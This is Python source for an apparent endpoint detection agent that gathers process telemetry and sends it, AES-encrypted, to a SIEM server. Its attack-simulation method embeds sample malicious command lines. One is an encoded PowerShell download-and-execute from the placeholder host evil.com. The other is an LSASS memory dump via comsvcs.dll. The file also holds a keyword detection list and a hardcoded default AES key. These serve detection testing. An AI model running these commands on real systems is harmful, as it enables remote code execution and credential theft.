"""
Endpoint Collector Agent for AegisXDR-Enterprise.
Monitors system processes, parent-child relationships, command-line arguments,
and encrypts telemetry with AES-256 for transmission to the SIEM server.
"""

import os
import sys
import time
import socket
import json
import base64
import argparse
import requests
import psutil

# Ensure relative imports work if agent directory is current directory
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from agent.crypto_utils import AgentCrypto

class AegisAgent:
    def __init__(self, config_path: str = "agent_config.json"):
        base_dir = os.path.dirname(os.path.abspath(__file__))
        full_config_path = os.path.join(base_dir, config_path)
        
        if os.path.exists(full_config_path):
            with open(full_config_path, "r") as f:
                self.config = json.load(f)
        else:
            self.config = {
                "agent_id": "AEGIS-AGENT-LOCAL",
                "server_url": "http://127.0.0.1:8000/api/v1/telemetry",
                "aes_key_b64": "QWVnaXNYRFJfU2VjdXJlX0FFUzI1Nl9LZXlfMzJCIQ==",
                "use_encryption": True,
                "poll_interval_seconds": 3
            }

        self.agent_id = self.config.get("agent_id", "AEGIS-AGENT-LOCAL")
        self.hostname = socket.gethostname()
        self.server_url = self.config.get("server_url", "http://127.0.0.1:8000/api/v1/telemetry")
        self.use_encryption = self.config.get("use_encryption", True)
        
        key_bytes = base64.b64decode(self.config["aes_key_b64"])
        self.crypto = AgentCrypto(key_bytes)
        self.seen_pids = set()

    def collect_process_tree(self) -> list:
        """Scans active system processes and extracts parent-child details."""
        events = []
        for proc in psutil.process_iter(['pid', 'ppid', 'name', 'cmdline', 'exe']):
            try:
                pinfo = proc.info
                pid = pinfo['pid']
                ppid = pinfo['ppid']
                p_name = pinfo['name'] or ""
                cmdline_list = pinfo['cmdline'] or []
                cmdline = " ".join(cmdline_list)
                exe_path = pinfo['exe'] or ""

                # Get Parent Process Name
                parent_name = "unknown"
                try:
                    parent_proc = psutil.Process(ppid)
                    parent_name = parent_proc.name()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    parent_name = "system_parent"

                event = {
                    "agent_id": self.agent_id,
                    "hostname": self.hostname,
                    "ip_address": socket.gethostbyname(self.hostname) if hasattr(socket, 'gethostbyname') else "127.0.0.1",
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    "pid": pid,
                    "process_name": p_name,
                    "ppid": ppid,
                    "parent_name": parent_name,
                    "cmdline": cmdline,
                    "process_path": exe_path
                }
                events.append(event)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue

        return events

    def send_telemetry(self, telemetry_event: dict):
        """Encrypts and POSTs telemetry payload to AegisXDR Core."""
        try:
            if self.use_encryption:
                encrypted_b64 = self.crypto.encrypt_telemetry(telemetry_event)
                payload = {
                    "encrypted": True,
                    "data": encrypted_b64
                }
            else:
                payload = telemetry_event
                payload["encrypted"] = False

            headers = {"Content-Type": "application/json"}
            res = requests.post(self.server_url, json=payload, headers=headers, timeout=5)
            if res.status_code == 200:
                result = res.json()
                if result.get("alerts_generated", 0) > 0:
                    print(f"[!] ALERTS TRIGGERED ({result['alerts_generated']}): {result.get('alerts')}")
                return True
            else:
                print(f"[-] Server returned error {res.status_code}: {res.text}")
                return False
        except Exception as e:
            print(f"[-] Failed to transmit telemetry to {self.server_url}: {e}")
            return False

    def simulate_attack_scenario(self):
        """Simulates synthetic malware telemetry (e.g. winword spawning encoded powershell)."""
        print("[*] Generating Synthetic Malware Telemetry Attack Simulation...")
        simulated_events = [
            {
                "agent_id": self.agent_id,
                "hostname": self.hostname,
                "ip_address": "192.168.1.105",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "pid": 4812,
                "process_name": "powershell.exe",
                "ppid": 2104,
                "parent_name": "winword.exe",
                "cmdline": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
                "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            {
                "agent_id": self.agent_id,
                "hostname": self.hostname,
                "ip_address": "192.168.1.105",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "pid": 5920,
                "process_name": "rundll32.exe",
                "ppid": 4812,
                "parent_name": "powershell.exe",
                "cmdline": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full",
                "process_path": "C:\\Windows\\System32\\rundll32.exe"
            }
        ]

        for evt in simulated_events:
            print(f"[+] Sending Simulated Telemetry: {evt['parent_name']} -> {evt['process_name']} | Cmd: {evt['cmdline'][:60]}...")
            self.send_telemetry(evt)
            time.sleep(1)

    def run(self, continuous: bool = False, poll_interval: int = 3):
        """Executes telemetry monitoring loop."""
        print(f"[*] AegisXDR Endpoint Agent [{self.agent_id}] Initialized.")
        print(f"[*] Target Server: {self.server_url} (AES-256 Encrypted: {self.use_encryption})")

        while True:
            events = self.collect_process_tree()
            new_events = [e for e in events if e['pid'] not in self.seen_pids]
            
            print(f"[*] Collected {len(events)} system processes ({len(new_events)} new).")
            
            # Send sample of new events or active shell processes
            for evt in events:
                p_name = evt['process_name'].lower()
                cmd = evt['cmdline'].lower()
                if any(x in p_name or x in cmd for x in ["powershell", "cmd", "wscript", "certutil", "-enc", "winword"]):
                    self.send_telemetry(evt)
                    self.seen_pids.add(evt['pid'])

            if not continuous:
                break
            time.sleep(poll_interval)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AegisXDR Endpoint Collector Agent")
    parser.add_argument("--continuous", action="store_true", help="Run in continuous monitoring mode")
    parser.add_argument("--simulate-attack", action="store_true", help="Transmit synthetic malware attack telemetry")
    args = parser.parse_args()

    agent = AegisAgent()
    if args.simulate_attack:
        agent.simulate_attack_scenario()
    else:
        agent.run(continuous=args.continuous)
